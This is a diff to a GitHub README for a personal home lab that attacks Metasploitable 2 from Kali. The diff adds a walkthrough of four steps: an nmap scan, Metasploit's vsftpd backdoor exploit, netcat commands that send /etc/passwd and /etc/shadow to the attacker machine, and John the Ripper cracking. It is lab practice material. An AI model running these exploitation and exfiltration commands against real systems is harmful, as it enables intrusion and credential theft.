@@ -1,6 +1,5 @@
 # Offensive-and-Defensive-Cybersecurity-Project
-
-📌 Overview
+ Overview
 This repository documents my personal **Red vs Blue cybersecurity lab** — a simulated corporate network environment designed to practice **offensive** and **defensive** security skills.  
 The goal of this project is to replicate real-world scenarios, execute attack simulations, and develop security controls to detect, mitigate, and respond to threats.
 
@@ -16,10 +15,10 @@ The goal of this project is to replicate real-world scenarios, execute attack si
 
 🖥️ Lab Architecture
 
-| Role          | OS / Tools Used |
+| Role          | OS / Tools Used | IP Address |
 |---------------|-----------------|
-| **Attacker**  | Kali Linux (Nmap, Metasploit, Hydra, John the Ripper) |
-| **Victim**    | Metasploitable 2 (vulnerable Linux target) |
+| **Attacker**  | Kali Linux (Nmap, Metasploit,  John the Ripper) | 192.168.27.5
+| **Victim**    | Metasploitable 2 (vulnerable Linux target) | 192.168.27.4
 | **Defender**  | Ubuntu Desktop (UFW firewall, fail2ban, IDS/IPS) |
 
 ## ⚔️ Red Team Activities
@@ -46,6 +45,62 @@ The goal of this project is to replicate real-world scenarios, execute attack si
 - **Utilities:** netcat, tcpdump, OpenVAS
 
 - ---
+
+--Step 1: VM Startup & Recon 
+
+---
+
+
+![Spinup](https://github.com/mfaustino4786/Offensive-and-Defensive-Cybersecurity-Project/blob/main/screenshots/Spinupvm.png)
+
+
+--ip a (check IP)
+
+![verifyIP](https://github.com/mfaustino4786/Offensive-and-Defensive-Cybersecurity-Project/blob/main/screenshots/verify%20ips.png)
+
+--nmap -sS -sV -0 192.168.27.4
+
+![nmap](https://github.com/mfaustino4786/Offensive-and-Defensive-Cybersecurity-Project/blob/main/screenshots/nmapscan.png)
+
+--Step 2:  Exploitation
+
+
+--msfconsole 
+
+![msfconsole](https://github.com/mfaustino4786/Offensive-and-Defensive-Cybersecurity-Project/blob/main/screenshots/msfconsole.png)
+
+
+--use exploit/unix/ftp/vsftpd_234_backdoor
+
+--set RHOSTS 192.168.27.4
+
+--run
+
+![runPayload](https://github.com/mfaustino4786/Offensive-and-Defensive-Cybersecurity-Project/blob/main/screenshots/runpayload.png)
+
+
+--Step 3: File Extraction
+
+
+
+
+--nc -lvnp 9001 > passwd
+
+--nc -lvnp 9002 > shadow
+
+--cat /etc/passwd | nc 192.168.27.5 9001
+
+--cat /etc/shadow | nc 192.168.27.5 9002
+
+![extract](https://github.com/mfaustino4786/Offensive-and-Defensive-Cybersecurity-Project/blob/main/screenshots/extractfiles.png)
+
+
+
+--Step 4: Password Cracking
+
+
+--john shadow --format=md5crypt-long
+
 
 ## 📅 Progress Log
 - **08/09/2025** Initial lab setup in VirtualBox
